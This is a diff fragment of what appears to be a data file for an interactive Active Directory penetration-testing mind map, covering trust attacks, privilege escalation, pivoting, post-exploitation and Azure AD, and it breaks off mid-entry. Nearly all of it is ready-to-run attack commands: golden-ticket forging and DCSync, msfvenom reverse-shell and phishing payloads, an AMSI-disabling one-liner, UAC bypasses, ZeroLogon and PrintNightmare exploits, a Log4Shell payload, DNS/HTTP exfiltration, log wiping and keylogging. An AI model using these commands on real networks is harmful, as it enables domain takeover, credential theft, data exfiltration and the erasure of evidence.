+    c('findstr cpassword','findstr /S /I cpassword \\\\domain.local\\sysvol\\domain.local\\policies\\*.xml'),
+    c('MSF GPP enum','use scanner/smb/smb_enum_gpp'),
+    c('gpp-decrypt','gpp-decrypt ENCRYPTED_CPASSWORD'),
+    c('CME gpp password','cme smb DC_IP -u user -p pass -M gpp_password'),
+    c('CME gpp autologin','cme smb DC_IP -u user -p pass -M gpp_autologin'),
+    nt('MS14-025: Group Policy Preferences stored AES-256 encrypted passwords but key is public; patched but old GPPs may still exist'),
+  ]),
+  h('DNSAdmins Abuse (CVE-2021-40469)',[
+    c('dnscmd set plugin dll','dnscmd.exe /config /serverlevelplugindll \\\\attacker\\share\\evil.dll'),
+    c('Stop DNS service','sc \\\\DC_IP stop dns'),
+    c('Start DNS service','sc \\\\DC_IP start dns'),
+    nt('Requires DNSAdmins group membership; DNS service runs as SYSTEM → SYSTEM on DC'),
+  ]),
+]},
+
+{id:'trust',label:'14. Trust & Forest Attacks',color:'#80deea',x:760,y:1280,parent:null,items:[
+  h('Enumerate Trusts',[
+    c('nltest','nltest.exe /trusted_domains'),
+    c('PowerShell all trusts','([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()'),
+    c('Get-DomainTrust','Get-DomainTrust -Domain domain.local'),
+    c('Get-DomainTrustMapping','Get-DomainTrustMapping'),
+    c('ldeep trusts','ldeep ldap -u user -p pass -d domain.local -s ldap://DC_IP trusts'),
+    c('Get-ForestTrust','Get-ForestTrust'),
+    c('Get-ForestDomain','Get-ForestDomain | select Name,PdcRoleOwner'),
+    c('External trusts filter','Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}'),
+  ]),
+  h('Child → Parent (Extra SIDs – Golden Ticket)',[
+    c('Get child domain SID','Get-DomainSID -Domain child.domain.local'),
+    c('Get parent domain SID','Get-DomainSID -Domain domain.local'),
+    c('lookupsid for SIDs','lookupsid.py -domain-sids domain.local/user:pass@DC_IP 0'),
+    c('Get KRBTGT child','mimikatz "lsadump::dcsync /domain:child.domain.local /user:child\\krbtgt"'),
+    c('Golden ticket extra SID','mimikatz "kerberos::golden /user:Administrator /krbtgt:HASH /domain:child.domain.local /sid:CHILD_SID /sids:PARENT_SID-519 /ptt"'),
+    c('ticketer.py extra SID','ticketer.py -nthash CHILD_KRBTGT_HASH -domain-sid CHILD_SID -domain child.domain.local -extra-sid PARENT_SID-519 goldenuser'),
+    c('raiseChild.py auto',"raiseChild.py domain.local/user:'pass'"),
+  ]),
+  h('Child → Parent (Trust Ticket)',[
+    c('Get trust key','mimikatz "lsadump::trust /patch"'),
+    c('Forge inter-realm ticket','mimikatz "kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID /aes256:TRUST_KEY_AES256 /sids:PARENT_SID-519 /service:krbtgt /target:domain.local /ptt"'),
+    c('ticketer.py trust','ticketer.py -nthash TRUST_KEY -domain-sid CHILD_SID -domain child.domain.local -extra-sid PARENT_SID-519 -spn krbtgt/domain.local trustuser'),
+    c('getST cifs','getST.py -k -no-pass -spn cifs/DC_FQDN domain.local/trustfakeuser@domain.local -debug'),
+  ]),
+  h('Forest → Forest (Extra SID with SID History)',[
+    c('Find groups SID > 1000','Get-DomainGroupMember -Identity "GROUP" -Domain target.domain.local'),
+    c('Golden extra SID > 1000','mimikatz "kerberos::golden /user:Administrator /krbtgt:HASH /domain:from.domain.local /sid:FROM_SID /sids:TO_SID-<GROUP_ID> /ptt"'),
+    c('ticketer.py cross-forest','ticketer.py -nthash KRBTGT_HASH -domain-sid FROM_SID -domain from.domain.local -extra-sid TO_DOMAIN-<GROUP_ID> goldenuser'),
+    nt('GROUP_ID must be > 1000 to bypass SID Filtering'),
+  ]),
+  h('Forest → Forest (Trust Ticket)',[
+    c('Get TARGET_DOMAIN$ trust ticket','# secretsdump and find TARGET_DOMAIN$ hash in NTDS'),
+    c('ticketer.py trust key','ticketer.py -nthash TRUST_KEY -domain-sid FROM_DOMAIN_SID -domain from.domain.local -extra-sid TO_DOMAIN-<GROUP_ID> -spn krbtgt/to.domain.local trustuser'),
+    c('getST cross-forest','getST.py -k -no-pass -spn cifs/DC_FQDN to.domain.local/trustfakeuser@to.domain.local -debug'),
+  ]),
+  h('Foreign Group Membership',[
+    c('BH foreign user members','MATCH p=(n:User)-[:MemberOf]->(m:Group) WHERE n.domain="DOMAIN" AND m.domain<>n.domain RETURN p'),
+    c('BH foreign group members','MATCH p=(n:Group {domain:"DOMAIN"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p'),
+    c('Get-DomainForeignGroupMember','Get-DomainForeignGroupMember -Domain target'),
+    c('convertfrom-sid','convertfrom-sid SID'),
+    nt('Users in foreign domain groups or ACLs → password reuse across trusts'),
+  ]),
+  h('Breaking Forest Trust (Unconstrained Deleg)',[
+    nt('Coerce DC of external forest → connect to unconstrained delegation machine → capture TGT → DCSync on external forest'),
+    c('Rubeus monitor','Rubeus.exe monitor /interval:5 /nowrap'),
+    c('PrinterBug coerce','printerbug.py from.domain.local/user:pass@external_dc.to.domain.local <unconstrained_machine>'),
+    c('PetitPotam coerce','PetitPotam.py -d from.domain.local -u user -p pass <unconstrained_machine> external_dc.to.domain.local'),
+  ]),
+  h('MSSQL Trusted Links Cross-Forest',[
+    c('Link crawl PS','Get-SQLServerLinkCrawl -username user -password pass -Verbose -Instance sql_instance'),
+    c('mssqlclient.py','mssqlclient.py -windows-auth domain.local/user:pass@DC_IP'),
+    c('sp_linkedservers','# EXEC sp_linkedservers'),
+    c('Execute on linked server','# EXEC (\'\'select system_user\'\') AT [LINKED_SERVER]'),
+  ]),
+]},
+
+{id:'localprivesc',label:'15. Local → Domain Pivot',color:'#a5d6a7',x:1220,y:1280,parent:null,items:[
+  h('Add Computer (MachineAccountQuota)',[
+    c('addcomputer.py','addcomputer.py -computer-name COMP$ -computer-pass COMPPASS -dc-host DC_IP -domain-netbios DOMAIN domain.local/user:pass'),
+    c('PowerMad PS','New-MachineAccount -MachineAccount COMP -Password (ConvertTo-SecureString "pass" -AsPlainText -Force)'),
+    c('Check quota','Get-DomainObject -Identity domain.local | select ms-ds-machineaccountquota'),
+    nt('Default quota: 10 computer accounts per regular user; used for RBCD/KrbRelayUp attacks'),
+  ]),
+  h('Cached Credentials',[
+    c('reg save for offline','reg save HKLM\\SECURITY security.bak; reg save HKLM\\SYSTEM system.bak'),
+    c('secretsdump MsCache2','secretsdump.py -security SECURITY -system SYSTEM LOCAL'),
+    c('hashcat mscache2','hashcat -m 2100 -a 0 mscache-hash rockyou.txt'),
+    nt('Contains: cached domain logon (MsCache2), machine account, service account creds'),
+  ]),
+  h('SeImpersonatePrivilege Escalation',[
+    c('PrintSpoofer','PrintSpoofer.exe -i -c cmd'),
+    c('RoguePotato','RoguePotato.exe -r <attacker_ip> -e "cmd.exe" -l 9999'),
+    c('JuicyPotato','JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}'),
+    c('GodPotato','GodPotato.exe -cmd "cmd /c whoami"'),
+    c('CertPotato','CertPotato.exe -e "cmd.exe"'),
+    nt('IIS, MSSQL, Exchange service accounts often have SeImpersonatePrivilege → SYSTEM'),
+  ]),
+  h('Machine Account Takeover (Shadow Creds)',[
+    c('certipy shadow machine',"certipy shadow auto -u 'machine$'@domain.local -k -account 'machine$'"),
+    c('Get machine NT hash','certipy auth -pfx machine.pfx -dc-ip DC_IP'),
+    c('Silver ticket machine hash','ticketer.py -nthash MACHINE_HASH -domain-sid DOMAIN_SID -domain domain.local -spn cifs/DC_FQDN targetUser'),
+    c('Rubeus tgtdeleg','Rubeus.exe tgtdeleg /nowrap'),
+    c('certipy machine cert req','certipy req -k -ca CA_NAME -template Machine -target DC_IP'),
+  ]),
+  h('Local Privilege Escalation',[
+    c('winpeas','winpeas.exe'),
+    c('PowerUp all checks','Invoke-AllChecks'),
+    c('token impersonation','use incognito; impersonate_token "domain.local\\\\admin"'),
+    c('AMSI bypass','# https://amsi.fail/ - reflection method or patching amsi.dll'),
+    c('UAC bypass FodHelper','# FodHelper / WSReset / MSDT UAC bypass methods'),
+    c('AppLocker bypass paths','# C:\\Windows\\Tasks or C:\\Windows\\Temp'),
+    c('AppLocker bypass tools','# installutil.exe / mshta.exe / MSBuild'),
+    c('CLM bypass','installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe'),
+    c('mshta CLM bypass','mshta.exe my.hta'),
+  ]),
+  h('Known Vulnerability Quick Wins',[
+    c('EternalBlue MS17-010','use exploit/windows/smb/ms17_010_eternalblue'),
+    c('PrintNightmare','use exploit/windows/smb/printnightmare'),
+    c('HiveNightmare CVE-2021-36934','# Read SAM/SYSTEM from shadow copies as standard user'),
+    c('SMBGhost CVE-2020-0796','# RCE via SMBv3 compression'),
+    c('Log4Shell','${jndi:ldap://<attacker_ip>:<port>/o=reference}'),
+    c('PrivExchange CVE-2019-0686','python privexchange.py -ah <attacker> <exchange_host> -u user -d domain.local -p pass'),
+    c('ProxyLogon Exchange CVE-2021-26855','# Exchange pre-auth SSRF → SYSTEM'),
+    c('ProxyShell Exchange CVE-2021-34473','# Exchange chain of vulns → SYSTEM'),
+  ]),
+]},
+
+{id:'bh_queries',label:'16. BloodHound Queries',color:'#f48fb1',x:1680,y:1280,parent:null,items:[
+  h('Find DA Paths',[
+    c('All shortest paths to DA','MATCH p=allShortestPaths((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p'),
+    c('Owned to DA','MATCH p=allShortestPaths((n {owned:true})-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p'),
+    c('Kerberoastable to DA','MATCH (u:User {hasspn:true}),(c:Computer),p=shortestPath((u)-[*1..]->(c)) RETURN p'),
+    c('ASREP to DA','MATCH (u:User {dontreqpreauth:true}),(c:Computer),p=shortestPath((u)-[*1..]->(c)) RETURN p'),
+  ]),
+  h('High-Value Target Enum',[
+    c('Kerberoastable users','MATCH (u:User {hasspn:true}) RETURN u'),
+    c('ASREPRoastable users','MATCH (u:User {dontreqpreauth:true}) RETURN u'),
+    c('Unconstrained deleg','MATCH (c:Computer {unconstraineddelegation:true}) RETURN c'),
+    c('LAPS readers','MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p'),
+    c('gMSA readers','MATCH p=(n)-[:ReadGMSAPassword]->(m:User) RETURN p'),
+    c('SQL admins','MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p'),
+    c('Constrained delegation','MATCH (c:Computer),(t:Computer),p=((c)-[:AllowedToDelegate]->(t)) RETURN p'),
+    c('DA sessions','MATCH p=(m:Computer)-[:HasSession]->(n:User)-[:MemberOf*1..]->(o:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p'),
+  ]),
+  h('ACL Abuse Paths',[
+    c('GenericWrite on GPO','MATCH (gr:Group),(gp:GPO),p=((gr)-[:GenericWrite]->(gp)) RETURN p'),
+    c('Shadow creds targets','MATCH p=(n)-[:GenericAll|GenericWrite]->(m:User) RETURN p'),
+    c('WriteDACL on DA group','MATCH p=(n)-[:WriteDacl]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p'),
+    c('Owned outbound control','MATCH p=(n {owned:true})-[:GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|ForceChangePassword]->(m) RETURN p'),
+  ]),
+  h('Foreign / Trust Queries',[
+    c('Foreign user group membership','MATCH p=(n:User)-[:MemberOf]->(m:Group) WHERE n.domain="A" AND m.domain<>n.domain RETURN p'),
+    c('Foreign group in domain','MATCH p=(n:Group {domain:"A"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p'),
+    c('LAPS readLAPSPassword','MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p'),
+  ]),
+  h('Mark Owned & Investigate',[
+    nt('Right-click node → Mark as Owned; then run Owned paths to DA'),
+    c('Find unprotected paths','# Outbound Object Control on each owned node'),
+    c('DA group members','MATCH (n:User)-[:MemberOf*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN n'),
+    c('Sessions on DC','MATCH p=(c:Computer {name:"DC.DOMAIN.LOCAL"})<-[:HasSession]-(n:User) RETURN p'),
+  ]),
+]},
+
+// ── 17. PIVOTING & TUNNELING ──────────────────────────────
+{id:'pivot',label:'17. Pivoting & Tunneling',color:'#26c6da',x:300,y:1760,parent:null,items:[
+  h('Chisel SOCKS5',[
+    c('Chisel server (attacker)','./chisel server -p 8888 --reverse'),
+    c('Chisel client (victim)','.\\chisel.exe client DC_IP:8888 R:socks'),
+    c('ProxyChains config','echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'),
+    c('Use proxychains','proxychains nmap -sT -Pn -p PORT DC_IP'),
+  ]),
+  h('Ligolo-ng',[
+    c('Ligolo server','./proxy -selfcert -laddr 0.0.0.0:11601'),
+    c('Ligolo agent','.\\agent.exe -connect DC_IP:11601 -ignore-cert'),
+    c('Add route (linux)','ip route add 192.168.1.0/24 dev ligolo'),
+    c('Tun interface','sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up'),
+  ]),
+  h('SSH Tunneling',[
+    c('Local forward','ssh -L LOCAL_PORT:INTERNAL_IP:INTERNAL_PORT user@PIVOT_IP'),
+    c('Dynamic SOCKS','ssh -D 1080 user@PIVOT_IP'),
+    c('Remote forward','ssh -R 8080:127.0.0.1:80 user@ATTACKER_IP'),
+    c('SSH via proxychains','proxychains ssh user@INTERNAL_IP'),
+  ]),
+  h('Netsh / Windows',[
+    c('Port forward','netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=445 connectaddress=DC_IP'),
+    c('List portproxy','netsh interface portproxy show all'),
+    c('Delete rule','netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0'),
+  ]),
+  h('SOCKS via CrackMapExec',[
+    c('ntlmrelayx socks','ntlmrelayx.py -tf targets.txt -smb2support -socks'),
+    c('Use socks proxy','proxychains secretsdump.py -no-pass domain.local/user@DC_IP'),
+    c('Socks list','socks'),
+  ]),
+  h('Other Tunnels',[
+    c('Socat forward','socat TCP-LISTEN:4444,fork TCP:INTERNAL_IP:445'),
+    c('rpivot server','python rpivot/server.py --proxy-port 9050 --server-port 9999'),
+    c('rpivot client','python rpivot/client.py --server-ip DC_IP --server-port 9999'),
+    c('DNS tunneling','iodine -f -P password DNS_SERVER tunnel.domain.com'),
+    c('ICMP tunnel','ptunnel-ng -p PIVOT_IP -lp 8000 -da INTERNAL_IP -dp 22'),
+  ]),
+]},
+
+// ── 18. LOCAL PRIVILEGE ESCALATION ───────────────────────
+{id:'localprivesc2',label:'18. Local Privilege Escalation',color:'#ef9a9a',x:760,y:1760,parent:null,items:[
+  h('Enumeration',[
+    c('WinPEAS','.\\winPEASx64.exe'),
+    c('WinPEAS quiet','.\\winPEASx64.exe quiet'),
+    c('PowerUp','Import-Module .\\PowerUp.ps1; Invoke-AllChecks'),
+    c('JAWS','IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1")'),
+    c('whoami privs','whoami /priv'),
+    c('whoami groups','whoami /groups'),
+    c('systeminfo','systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"'),
+  ]),
+  h('Token Abuse (SeImpersonate)',[
+    c('GodPotato','.\\GodPotato.exe -cmd "cmd /c whoami"'),
+    c('PrintSpoofer','.\\PrintSpoofer.exe -i -c cmd'),
+    c('RoguePotato','.\\RoguePotato.exe -r DC_IP -e "cmd.exe" -l 9999'),
+    c('JuicyPotato','.\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami" -t *'),
+    c('SweetPotato','.\\SweetPotato.exe -p "cmd.exe" -a "/c whoami"'),
+    c('CertPotato','.\\CertPotato.exe -c "cmd /c whoami"'),
+    c('KrbRelayUp','.\\KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount'),
+  ]),
+  h('Service / Binary Abuse',[
+    c('Unquoted service path','wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v """'),
+    c('Weak service perms','sc qc ServiceName'),
+    c('Replace binary','copy malicious.exe "C:\\Path\\to\\service.exe"'),
+    c('Weak file perms','icacls "C:\\Path\\to\\file.exe"'),
+    c('Service restart','sc stop ServiceName && sc start ServiceName'),
+  ]),
+  h('Registry / Scheduled Tasks',[
+    c('AlwaysInstallElevated check','reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'),
+    c('Create malicious MSI','msfvenom -p windows/x64/shell_reverse_tcp LHOST=DC_IP LPORT=PORT -f msi -o evil.msi'),
+    c('Run MSI','msiexec /quiet /qn /i evil.msi'),
+    c('Startup tasks','schtasks /query /fo LIST /v | findstr "Task Name\\|Run As User\\|Task To Run"'),
+    c('DLL hijack location','procmon64.exe (filter: Result=NAME NOT FOUND, Path ends with .dll)'),
+  ]),
+  h('UAC Bypass',[
+    c('FodHelper bypass','New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force; Set-ItemProperty -Path ... -Name "(default)" -Value "cmd.exe"'),
+    c('WSReset bypass','REG ADD HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command /d "cmd.exe" /f'),
+    c('MSDT bypass','ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c .exe&IT_LaunchMethod=ContextMenu&IT_SelectProgram=NotListed&IT_AutoTroubleshoot=ts_AUTO"'),
+    c('eventvwr bypass','New-Item "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command"; Set-ItemProperty -Path ... -Name "(default)" -Value "cmd.exe"'),
+  ]),
+  h('CVE / Exploits',[
+    c('PrintNightmare','python3 CVE-2021-1675.py domain.local/user:pass@DC_IP "\\\\DC_IP\\share\\inject.dll"'),
+    c('HiveNightmare (CVE-2021-36934)','vssadmin list shadows'),
+    c('SMBGhost (CVE-2020-0796)','python3 SMBGhost_RCE_PoC.py --ip DC_IP'),
+    c('MS14-068','goldenPac.py -dc-ip DC_IP domain.local/user:pass@DC_IP'),
+  ]),
+  h('AMSI / AppLocker Bypass',[
+    c('AMSI patch (reflection)','$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$b=$a.GetField("amsiInitFailed","NonPublic,Static");$b.SetValue($null,$true)'),
+    c('AMSI generator','# Visit https://amsi.fail/ for bypass one-liners'),
+    c('AppLocker bypass dirs','# Allowed: C:\\Windows\\Tasks, C:\\Windows\\Temp, C:\\Windows\\tracing'),
+    c('InstallUtil bypass','installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe'),
+    c('MSBuild bypass','C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe payload.csproj'),
+    c('mshta bypass','mshta.exe http://DC_IP/payload.hta'),
+    c('CLM bypass','installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe'),
+  ]),
+]},
+
+// ── 19. POST-EXPLOITATION ─────────────────────────────────
+{id:'postex',label:'19. Post-Exploitation',color:'#ce93d8',x:1220,y:1760,parent:null,items:[
+  h('Data Exfiltration',[
+    c('7zip encrypt','7z a -p"Password1" data.7z C:\\Sensitive\\'),
+    c('Exfil via DNS','nslookup $(cat secret.txt | base64) DC_IP'),
+    c('Exfil via HTTP','curl -F "file=@loot.zip" http://DC_IP:PORT/upload'),
+    c('SMB copy','copy C:\\Sensitive\\*.* \\\\DC_IP\\share\\loot\\'),
+    c('certutil encode','certutil -encode malware.exe malware.txt'),
+    c('certutil decode','certutil -decode malware.txt malware.exe'),
+    c('PowerShell download','(New-Object Net.WebClient).DownloadFile("http://DC_IP/file","C:\\Temp\\file")'),
+    c('Invoke-WebRequest','Invoke-WebRequest -Uri "http://DC_IP/file" -OutFile "C:\\Temp\\file"'),
+  ]),
+  h('Credential Hunting',[
+    c('findstr passwords','findstr /si password *.txt *.ini *.config *.xml'),
+    c('findstr cred files','dir /s /b *pass* *cred* *vnc* *.config 2>nul'),
+    c('Registry AutoLogon','reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"'),
+    c('Unattend files','type C:\\Windows\\Panther\\Unattend.xml'),
+    c('LAPS query','Get-ADComputer -Filter * -Properties ms-McsAdmPwd | Select-Object Name, ms-McsAdmPwd'),
+    c('LAPS via CME','cme ldap DC_IP -u user -p pass -M laps'),
+    c('Wifi passwords','netsh wlan show profile name="SSID" key=clear'),
+    c('Chrome creds','SharpChrome.exe logins'),
+    c('LaZagne all','laZagne.exe all'),
+  ]),
+  h('Lateral Movement Extended',[
+    c('nxc command exec','nxc smb DC_IP/24 -u user -p pass -x "whoami"'),
+    c('nxc PS exec','nxc smb DC_IP/24 -u user -p pass -X "powershell -c whoami"'),
+    c('nxc sam dump','nxc smb DC_IP -u user -p pass --sam'),
+    c('nxc lsa dump','nxc smb DC_IP -u user -p pass --lsa'),
+    c('nxc spider shares','nxc smb DC_IP -u user -p pass -M spider_plus'),
+    c('nxc RDP enable','nxc smb DC_IP -u user -p pass -M rdp -o ACTION=enable'),
+  ]),
+  h('Cleaning Tracks',[
+    c('Clear event logs','wevtutil cl System && wevtutil cl Security && wevtutil cl Application'),
+    c('Clear PS history','Remove-Item (Get-PSReadlineOption).HistorySavePath'),
+    c('Clear prefetch','del /f /q C:\\Windows\\Prefetch\\*'),
+    c('Timestomp (touch)','touch -t 202001010000 file'),
+    c('Disable logging','Set-ItemProperty -Path "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0'),
+  ]),
+  h('Screenshot / Keylogging',[
+    c('Meterpreter screenshot','screenshot'),
+    c('Meterpreter keyscan','keyscan_start; keyscan_dump'),
+    c('PowerShell screenshot','Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen'),
+    c('CME screenshot','cme smb DC_IP -u user -p pass -M screenshot'),
+  ]),
+]},
+
+// ── 20. AZURE AD / HYBRID ENVIRONMENT ────────────────────
+{id:'azuread',label:'20. Azure AD / Hybrid',color:'#4fc3f7',x:1680,y:1760,parent:null,items:[
+  h('Azure AD Connect',[
+    c('Find MSOL account','cme ldap DC_IP -u user -p pass -M get-desc-users | grep -i MSOL'),
+    c('Dump MSOL cleartext','azuread_decrypt_msol_v2.ps1'),
+    c('CME msol module','cme smb DC_IP -u user -p pass -M msol'),
+    c('DCSync after MSOL','secretsdump.py domain.local/MSOL_user:cleartext@DC_IP'),
+  ]),
+  h('AzureHound',[
+    c('Run AzureHound','.\\AzureHound.exe -u USER@DOMAIN -p PASS -t TENANT_ID'),
+    c('AzureHound token','.\\AzureHound.exe -j ACCESS_TOKEN'),
+    c('Import to BH','# Import AzureHound output JSON into BloodHound'),
+    c('Find paths to Azure','MATCH p=(n)-[r]->(m:AZTenant) RETURN p'),
+  ]),
+  h('Azure Enumeration',[
+    c('az login','az login --use-device-code'),
+    c('az account info','az account show'),
+    c('List subscriptions','az account list --output table'),
+    c('List VMs','az vm list --output table'),
+    c('List storage','az storage account list --output table'),
+    c('List key vaults','az keyvault list --output table'),
+    c('List app registrations','az ad app list --output table'),
+    c('List service principals','az ad sp list --output table'),
+    c('List users','az ad user list --output table'),
+    c('List groups','az ad group list --output table'),
+    c('IMDS token','curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"'),
+  ]),
+  h('Azure Privesc',[
+    c('Assign role','az role assignment create --assignee USER_ID --role Owner --scope /subscriptions/SUB_ID'),
+    c('Reset SP creds','az ad sp credential reset --id APP_ID'),
+    c('Add member to group','az ad group member add -g GROUP_ID --member-id USER_ID'),
+    c('Access keyvault','az keyvault secret list --vault-name VAULT_NAME'),
+    c('Download secret','az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME'),
+  ]),
+  h('ROADtools',[
+    c('ROADrecon gather','roadrecon gather -u USER@DOMAIN -p PASS'),
+    c('ROADrecon gui','roadrecon gui'),
+    c('ROADrecon dump','roadrecon dump'),
+  ]),
+  h('Token / OAuth Abuse',[
+    c('TokenTactics','Import-Module .\\TokenTactics.ps1; Get-AzureToken -Client MSGraph'),
+    c('Graph API users','Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers @{Authorization="Bearer $token"}'),
+    c('PRT abuse','roadtx gettokens --prt PRT --prt-sessionkey KEY'),
+  ]),
+]},
+
+// ── 21. ATTACK PATH TECHNIQUES ───────────────────────────
+{id:'attackpath',label:'21. Attack Path Techniques',color:'#ffca28',x:300,y:2200,parent:null,items:[
+  h('Initial Access',[
+    c('Phishing - macro','msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=DC_IP LPORT=PORT -f docm -o payload.docm'),
+    c('Phishing - HTA','msfvenom -p windows/x64/shell_reverse_tcp LHOST=DC_IP LPORT=PORT -f hta-psh -o payload.hta'),
+    c('Phishing - LNK','$wsh=New-Object -ComObject WScript.Shell; $lnk=$wsh.CreateShortcut("C:\\Temp\\file.lnk"); $lnk.TargetPath="cmd.exe"; $lnk.Arguments="/c powershell..."; $lnk.Save()'),
+    c('NTLM capture - link','slinky -o NAME=important SERVER=DC_IP'),
+    c('Spray & pray','kerbrute passwordspray -d domain.local --dc DC_IP users.txt "Password123!"'),
+  ]),
+  h('Domain User → Domain Admin',[
+    c('Step 1: Enum','bloodhound-python -d domain.local -u user -p pass -gc DC_IP -c all'),
+    c('Step 2: Find path','# BH query: Shortest path to Domain Admins'),
+    c('Step 3: Kerberoast','GetUserSPNs.py -request -dc-ip DC_IP domain.local/user:pass'),
+    c('Step 4: Crack hash','hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt'),
+    c('Step 5: PTH/PTT','secretsdump.py domain.local/svcaccount:crackedpass@DC_IP'),
+  ]),
+  h('Owned Computer → Domain Admin',[
+    c('Dump local SAM','secretsdump.py -sam SAM -system SYSTEM LOCAL'),
+    c('Reuse local hash','nxc smb DC_IP/24 -u administrator -H :LMHASH --local-auth'),
+    c('Find DA sessions','MATCH p=(m:Computer)-[:HasSession]->(n:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p'),
+    c('Hijack DA session','mimikatz "privilege::debug sekurlsa::tickets /export"'),
+  ]),
+  h('Service Account → Privesc',[
+    c('Kerberoast SVC','GetUserSPNs.py -request -dc-ip DC_IP domain.local/user:pass -outputfile svc.hashes'),
+    c('Crack offline','hashcat -m 13100 svc.hashes rockyou.txt --force'),
+    c('Check SVC perms','MATCH (u:User {hasspn:true}), (g:Group), p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p'),
+    c('SVC → DA via ACL','# Check GenericAll/WriteDACL/etc on sensitive objects'),
+  ]),
+  h('Low User → High Privilege (CVEs)',[
+    c('NoPac (CVE-2021-42278/42287)','.\\noPac.exe -domain domain.local -user user -pass pass /dc DC_IP /mAccount MACHINE$ /mPassword Passw0rd /service cifs /ptt'),
+    c('Certifried (CVE-2022-26923)','certipy account create -u user@domain.local -p pass -user certifriedpc -pass certifriedpass -dns DC_IP'),
+    c('ZeroLogon (CVE-2020-1472)','python3 cve-2020-1472-exploit.py DC_NETBIOS DC_IP'),
+    c('PrintNightmare (CVE-2021-1675)','python3 CVE-2021-1675.py domain.local/user:pass@DC_IP "\\\\DC_IP\\share\\inject.dll"'),
+    c('MS14-068','goldenPac.py -dc-ip DC_IP domain.local/user:pass@TARGET_IP'),
+  ]),
+  h('Forest Trust Compromise',[
+    c('Child → Parent (extra SID)','ticketer.py -nthash KRBTGT_HASH -domain-sid CHILD_SID -domain child.domain.local -extra-sid PARENT_SID-519 goldenuser'),
+    c('Inter-realm TGT','mimikatz "lsadump::trust /patch"'),
+    c('raiseChild','raiseChild.py domain.local/user:pass'),
+    c('Forest → Forest SID','ticketer.py -nthash KRBTGT_HASH -domain-sid FROM_SID -domain from.domain -extra-sid TO_DOMAIN-GROUP_ID goldenuser'),
+  ]),
+]},
+
+// ── 22. NETWORK SERVICES ATTACKS ─────────────────────────
+{id:'netserv',label:'22. Network Services',color:'#a5d6a7',x:760,y:2200,parent:null,items:[
+  h('WSUS Attacks',[
+    c('WSUSpendu','WSUSpendu.ps1 # requires compromised WSUS server'),
+    c('WSUSpect','WSUSpect # WSUS interception attack'),
+    c('Find WSUS server','reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer'),
+    c('NTLM relay to WSUS','pywsus.py'),
+  ]),
+  h('SCCM / ConfigMgr',[
+    c('CMPivot abuse','CMPivot # via SCCM admin console'),
+    c('PowerSCCM','Import-Module PowerSCCM.ps1'),
+    c('SharpSCCM','.\\SharpSCCM.exe get site-info'),
+    c('SharpSCCM NAA creds','.\\SharpSCCM.exe get naa -sccm SCCM_SERVER'),
+    c('Relay to SCCM','ntlmrelayx.py -t http://SCCM_IP/ccm_system_windowsauth -smb2support'),
+  ]),
+  h('Exchange / PrivExchange',[
+    c('PrivExchange','python privexchange.py -ah DC_IP EXCHANGE_HOST -u user -d domain.local -p pass'),
+    c('ProxyLogon','python proxylogon.py -t EXCHANGE_IP -e EMAIL -c "cmd /c whoami"'),
+    c('ProxyShell','python proxyshell.py -u https://EXCHANGE_IP'),
+    c('ProxyRelay','ntlmrelayx.py -t https://EXCHANGE_IP/EWS/Exchange.asmx -smb2support'),
+  ]),
+  h('Java / Tomcat',[
